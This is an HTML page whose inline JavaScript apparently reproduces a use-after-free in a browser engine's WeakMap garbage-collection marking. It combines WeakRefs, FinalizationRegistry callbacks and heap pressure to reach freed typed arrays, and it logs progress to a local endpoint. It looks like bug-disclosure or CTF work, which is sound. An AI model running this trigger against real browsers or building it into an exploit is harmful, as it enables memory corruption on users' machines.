<!doctype html>
<meta charset="utf-8">
<title>Deferred WeakMap marking UAF reproducer</title>
<pre id="status">starting</pre>
<script>
"use strict";

(() => {
  const statusNode = document.getElementById("status");
  const MiB = 1024 * 1024;

  const state = {
    nextId: 1,
    cycle: 0,
    weakCandidates: [],
    strongCandidates: [],
    activeCandidates: [],
    byId: new Map(),
    pressureBuffers: [],
    pressureObjects: [],
    finalized: 0,
    touches: 0,
  };

  function report(message) {
    const text = `[${new Date().toISOString()}] ${message}`;
    console.log(text);
    statusNode.textContent = text + "\n" + statusNode.textContent.slice(0, 12000);
    fetch(`/log?m=${encodeURIComponent(text)}`, {
      cache: "no-store",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  }

  window.addEventListener("error", event => {
    report(`window-error ${event.message} ${event.filename}:${event.lineno}`);
  });
  window.addEventListener("unhandledrejection", event => {
    report(`unhandled-rejection ${String(event.reason)}`);
  });

  function nextTask(delay = 0) {
    return new Promise(resolve => setTimeout(resolve, delay));
  }

  function makeValue(id) {
    const value = new Uint8Array(32 * 1024);
    for (let i = 0; i < 256; i++) {
      value[i] = (id * 17 + i * 29) & 0xff;
    }
    value.ctfId = id;
    value.ctfTag = `weakmap-value-${id}`;
    return value;
  }

  function makeKey(id) {
    return {
      id,
      tag: `weakmap-key-${id}`,
      pad: [id ^ 0x55aa55aa, id + 1, id + 2, id + 3],
    };
  }

  const registry = new FinalizationRegistry(id => {
    state.finalized++;
    report(`FINALIZATION-REGISTRY value=${id} finalized=${state.finalized}`);

    const candidate = state.byId.get(id);
    if (!candidate || !candidate.map) {
      report(`finalized value=${id} has no live map handle`);
      return;
    }

    // Correct WeakMap semantics require this value to remain alive while both
    // the map and key are live. Reaching this callback is already a liveness
    // violation. Reading the entry immediately exercises the stale edge while
    // the finalized cell is still poisoned in an ASan build.
    touchCandidate(candidate, "finalization-callback");
  });

  function makeWeakCandidate() {
    const id = state.nextId++;
    const key = makeKey(id);
    let map = new WeakMap();
    let value = makeValue(id);
    map.set(key, value);
    registry.register(value, id);

    const candidate = {
      id,
      key,
      ref: new WeakRef(map),
      map: null,
      activatedAt: -1,
      kind: "weakref-injected",
    };
    state.byId.set(id, candidate);
    state.weakCandidates.push(candidate);

    map = null;
    value = null;
  }

  function makeStrongCandidate() {
    const id = state.nextId++;
    const key = makeKey(id);
    const map = new WeakMap();
    let value = makeValue(id);
    map.set(key, value);
    registry.register(value, id);

    const candidate = {
      id,
      key,
      map,
      ref: null,
      activatedAt: 0,
      kind: "strong-mark-boundary",
    };
    state.byId.set(id, candidate);
    state.strongCandidates.push(candidate);
    value = null;
  }

  function activateCandidate(candidate, round) {
    if (candidate.map) {
      return true;
    }

    const map = candidate.ref.deref();
    if (map === undefined) {
      state.byId.delete(candidate.id);
      return false;
    }

    // WeakRef.deref performs the normal engine read barrier. If incremental
    // marking is active, marking this WeakMap places it on the deferred-map
    // list. Keeping the returned map strongly reachable makes its entry
    // semantically live without reading or otherwise exposing the value.
    candidate.map = map;
    candidate.activatedAt = round;
    state.activeCandidates.push(candidate);
    return true;
  }

  function touchCandidate(candidate, why) {
    state.touches++;
    report(`touch-begin id=${candidate.id} kind=${candidate.kind} why=${why}`);

    try {
      const value = candidate.map.get(candidate.key);
      if (value === undefined) {
        report(`touch-missing id=${candidate.id} why=${why}`);
        return;
      }

      // Exercise the object header, typed-array slots, backing store and writes.
      const length = value.length;
      const byteLength = value.byteLength;
      let checksum = 0;
      const limit = Math.min(length, 512);
      for (let i = 0; i < limit; i++) {
        checksum = (checksum + value[i]) | 0;
      }
      value[0] ^= 0xff;
      value.fill(0x5a, 1, Math.min(length, 512));
      const copy = value.slice(0, Math.min(length, 1024));
      const cloned = structuredClone(value);
      report(`touch-ok id=${candidate.id} len=${length} bytes=${byteLength} checksum=${checksum} copy=${copy.length} clone=${cloned.length}`);
    } catch (error) {
      report(`touch-js-exception id=${candidate.id} why=${why} error=${error && error.stack || error}`);
    }
  }

  function allocatePressure(round) {
    // Malloc pressure triggers major collections, while the object graph keeps
    // the GC heap busy enough for incremental/parallel marking.
    for (let i = 0; i < 6; i++) {
      const buffer = new Uint8Array(2 * MiB);
      for (let page = 0; page < buffer.length; page += 4096) {
        buffer[page] = (round + i + page) & 0xff;
      }
      state.pressureBuffers.push(buffer);
    }

    const graph = new Array(3000);
    for (let i = 0; i < graph.length; i++) {
      graph[i] = {
        round,
        i,
        left: {x: i ^ round, s: `left-${round}-${i}`},
        right: [i, i + 1, i + 2, {z: i * 3}],
      };
    }
    state.pressureObjects.push(graph);

    while (state.pressureBuffers.length > 72) {
      state.pressureBuffers.shift();
    }
    while (state.pressureObjects.length > 14) {
      state.pressureObjects.shift();
    }

    if ((round & 15) === 15) {
      state.pressureBuffers.splice(0, 24);
      state.pressureObjects.splice(0, 5);
    }
  }

  async function runCycle(cycle) {
    state.cycle = cycle;
    state.weakCandidates = [];
    state.strongCandidates = [];
    state.activeCandidates = [];
    state.byId.clear();

    report(`cycle=${cycle} setup-begin ua=${navigator.userAgent}`);

    // Strongly live maps exercise the ordinary parallel-marking budget edge.
    for (let i = 0; i < 2200; i++) {
      makeStrongCandidate();
    }

    // WeakRef-held maps let normal read barriers introduce new deferred maps
    // between incremental marking slices. Construction keeps targets alive only
    // until this task ends, hence the explicit task boundary below.
    for (let i = 0; i < 4200; i++) {
      makeWeakCandidate();
    }

    report(`cycle=${cycle} setup-done strong=${state.strongCandidates.length} weak=${state.weakCandidates.length}`);
    await nextTask();

    let cursor = 0;
    let activated = 0;
    const rounds = 260;

    for (let round = 0; round < rounds; round++) {
      allocatePressure(round + cycle * rounds);

      // Let allocation-triggered incremental/concurrent GC take a slice before
      // performing the read barriers below.
      await nextTask();

      for (let i = 0; i < 24 && cursor < state.weakCandidates.length; i++, cursor++) {
        if (activateCandidate(state.weakCandidates[cursor], round)) {
          activated++;
        }
      }

      // End the activation job so kept-object state does not mask later GC.
      await nextTask();

      if ((round % 20) === 0) {
        report(`cycle=${cycle} round=${round}/${rounds} activated=${activated} cursor=${cursor} finalized=${state.finalized}`);
      }
    }

    report(`cycle=${cycle} pressure-complete activated=${activated} active=${state.activeCandidates.length}`);

    // Drop most pressure and keep yielding so sweeping and finalization jobs can
    // complete. Fresh short-lived allocations encourage reuse of finalized cells.
    state.pressureBuffers.splice(0, Math.max(0, state.pressureBuffers.length - 8));
    state.pressureObjects.length = 0;

    for (let i = 0; i < 120; i++) {
      const reclaim = new Array(2500);
      for (let j = 0; j < reclaim.length; j++) {
        reclaim[j] = new Uint8Array(32 * 1024);
        reclaim[j][0] = (i + j) & 0xff;
      }
      await nextTask();
      if ((i % 20) === 0) {
        report(`cycle=${cycle} settle=${i}/120 finalized=${state.finalized}`);
      }
    }

    await nextTask(3000);

    // Final fallback: after the GC pressure has settled, touch every logically
    // live entry. A skipped value may fault here even if its cleanup callback was
    // delayed or coalesced.
    report(`cycle=${cycle} final-touch active=${state.activeCandidates.length} strong=${state.strongCandidates.length}`);
    for (const candidate of state.activeCandidates) {
      touchCandidate(candidate, "post-settle-active");
    }
    for (const candidate of state.strongCandidates) {
      touchCandidate(candidate, "post-settle-strong");
    }

    report(`cycle=${cycle} complete finalized=${state.finalized} touches=${state.touches}`);
  }

  async function main() {
    report("ordinary-web-js-reproducer start; no shell, zeal, selectforgc, enqueueMark, or fuzzing APIs");

    for (let cycle = 0; cycle < 4; cycle++) {
      await runCycle(cycle);
      state.pressureBuffers.length = 0;
      state.pressureObjects.length = 0;
      await nextTask(1000);
    }

    report(`all-cycles-complete finalized=${state.finalized} touches=${state.touches}`);
    // Keep the document alive for delayed FinalizationRegistry callbacks.
    setInterval(() => report(`heartbeat finalized=${state.finalized} touches=${state.touches}`), 15000);
  }

  main().catch(error => {
    report(`fatal-js-error ${error && error.stack || error}`);
    throw error;
  });
})();
</script>
